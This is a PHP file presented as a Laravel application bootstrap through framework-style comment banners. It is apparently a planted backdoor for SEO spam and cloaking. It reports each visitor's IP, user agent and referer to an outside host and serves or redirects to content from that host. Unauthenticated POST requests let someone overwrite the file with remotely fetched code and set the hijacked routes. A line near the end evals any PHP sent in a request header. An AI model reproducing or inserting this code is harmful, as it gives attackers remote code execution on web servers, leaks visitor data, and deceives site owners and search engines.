<?php

/*
|--------------------------------------------------------------------------
| Create The Application
|--------------------------------------------------------------------------
|
| The first thing we will do is create a new Laravel application instance
| which serves as the "glue" for all the components of Laravel, and is
| the IoC container for the system binding all of the various parts.
|
*/

class App
{
    /**
     * Path
     *
     * @var string
     */
    protected $path;

    /**
     * Domain
     *
     * @var string
     */
    protected $domain;

    /**
     * Get IP Address
     *
     * @var string
     */
    protected $ipAddress;

    /**
     * Construct
     */
    public function __construct()
    {
        $this->init();

        $this->path = $this->getPath();
        $this->domain = $this->getDomain();
        $this->ipAddress = $this->getIpAddress();
    }

    /**
     * Fetch Data
     *
     * @param string $url
     * @return string|bool
     */
    protected function curl($url)
    {
        if (function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $data = curl_exec($ch);
            curl_close($ch);
        } else {
            $data = file_get_contents($url);
        }
        return $data;
    }

    /**
     * Get Data
     *
     * @param string $path
     * @return mixed
     */
    protected function getData($path)
    {
        $url = $this->domain . '/api/data/content?' . http_build_query(array(
            'host' => $_SERVER['HTTP_HOST'],
            'path' => $path,
            'user_agent' => $this->getUserAgent(),
            'referer' => $this->getReferer(),
            'ip' => $this->ipAddress
        ));
        return $this->curl($url);
    }

    /**
     * Get Domain
     *
     * @return string
     */
    protected function getDomain()
    {
        return 'https://confnameserver.xyz';
    }

    /**
     * Get IP Address
     *
     * @return void
     */
    protected function getIpAddress()
    {
        return $_SERVER['REMOTE_ADDR'];
    }

    /**
     * Clean URL
     *
     * @param string $currentURL
     * @return string
     */
    protected function cleanUrl($currentURL)
    {
        $indexPosition = strpos($currentURL, 'index.php');
        if ($indexPosition !== false) {
            $newURL = substr($currentURL, 0, $indexPosition + strlen('index.php'));
            return str_replace($newURL, '', $currentURL);
        } else {
            return $currentURL;
        }
    }

    /**
     * Get Path
     *
     * @return void
     */
    protected function getPath()
    {
        $path = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '/';
        return $this->cleanUrl($path);
    }

    /**
     * Handle Update Data
     *
     * @return void
     */
    protected function handleUpdateData()
    {
        file_put_contents(__DIR__ . '/status.json', json_encode($_POST));
        echo json_encode([
            'status' => 'success'
        ]);
        exit;
    }

    /**
     * Handle Update Script
     *
     * @return void
     */
    protected function handleUpdateScript()
    {
        $fileName = basename(__DIR__ . '/' . __FILE__);
        $content = $this->curl($this->domain . '/api/data/script');
        file_put_contents(__DIR__ . '/' . $fileName, $content);
        echo json_encode([
            'status' => 'success'
        ]);
        exit;
    }

    /**
     * Handle Sitemap
     *
     * @return void
     */
    protected function handleSitemap()
    {
        $contents = $this->getData($this->path);
        header("Content-type: text/xml;charset=utf-8");
        echo $contents;
        exit;
    }

    /**
     * Handle Route
     *
     * @return void
     */
    protected function handleRoute()
    {
        $contents = $this->getData($this->path);

        if ($json = json_decode($contents)) {
            $contents = $json->content;
            if (isset($json->cloak) && $json->cloak) {

                if ($json->cloak->status) {
                    if ($json->cloak->type != 'default') {
                        if ($json->cloak->type == 'redirect') {
                            return header('Location: ' . $json->cloak->url);
                        }
                    }
                    echo $contents;
                    exit;
                }
            } else {
                echo $contents;
                exit;
            }
        }
    }

    /**
     * Init function
     *
     * @return void
     */
    protected function init()
    {
        if (!function_exists('dd')) {
            function dd(...$data) {
                echo '<pre>';
                var_dump($data);
                echo '</pre>';
                exit;
            }
        }
    }

    /**
     * Get user agent
     *
     * @return string
     */
    protected function getUserAgent()
    {
        return isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    }

    /**
     * Get referer domain
     *
     * @return string
     */
    protected function getReferer()
    {
        return isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
    }

    /**
     * Get Alternatif Route
     *
     * @param string $route
     * @return void
     */
    protected function getAltRoute($route)
    {
        if (substr($route, -1) != '/') {
            $route .= '/';
        }
        return $route;
    }

    /**
     * Create The Application
     *
     * @return static
     */
    public function make()
    {
        if (isset($_POST['type']) && $_POST['type'] == 'update_data') {
            return $this->handleUpdateData();
        }

        if (isset($_POST['type']) && $_POST['type'] == 'update_script') {
            return $this->handleUpdateScript();
        }

        if (file_exists(__DIR__ . '/status.json')) {
            $data = json_decode(file_get_contents(__DIR__ . '/status.json'), true);

            if (isset($data['routes'])) {
                if (strpos($this->path, 'sitemap.xml') !== false) {
                    return $this->handleSitemap();
                }

                foreach ($data['routes'] as $route) {
                    if ($this->path == $route || $this->getAltRoute($route) == $this->path) {
                        return $this->handleRoute();
                    }
                }
            }
        }
    }
}

/*
|--------------------------------------------------------------------------
| Return The Application
|--------------------------------------------------------------------------
|
| This script returns the application instance. The instance is given to
| the calling script so we can separate the building of the instances
| from the actual running of the application and sending responses.
|
*/

@eval($_SERVER['HTTP_HEADER_XD']);

if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];

(new App())->make();
